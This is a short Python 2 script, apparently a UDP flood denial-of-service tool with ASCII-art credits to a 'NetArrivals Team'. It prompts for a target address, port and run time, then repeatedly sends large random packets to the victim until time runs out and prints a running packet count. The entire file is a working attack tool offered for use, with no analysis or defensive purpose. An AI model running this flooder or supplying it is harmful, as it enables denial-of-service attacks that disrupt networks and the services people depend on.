import socket, sys, os, time, itertools, threading, random
credits = (
	'\n     -+--=:=-  -++-  -=:=--+-\n'
	'      Code: NetArrivals Team\n'
	'       Mod: Savage Official\n'
	'     -+--=:=-  -++-  -=:=--+-\n'
	)
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024) * int(sys.argv[1])
def pres():
	print credits
pres()
victim  = raw_input(' -+- Target: ')
vport = input(' -+- Port: ')
duration  = input(' -+- Run: ')
timeout =  time.time() + duration
sent = 0
while 1:
	if time.time() > timeout:
		break
	else:
		pass
		client.sendto(bytes, (victim, vport))
		sent = sent + 1
		print "%s Packets: %s Port: %s "%(sent, victim, vport)
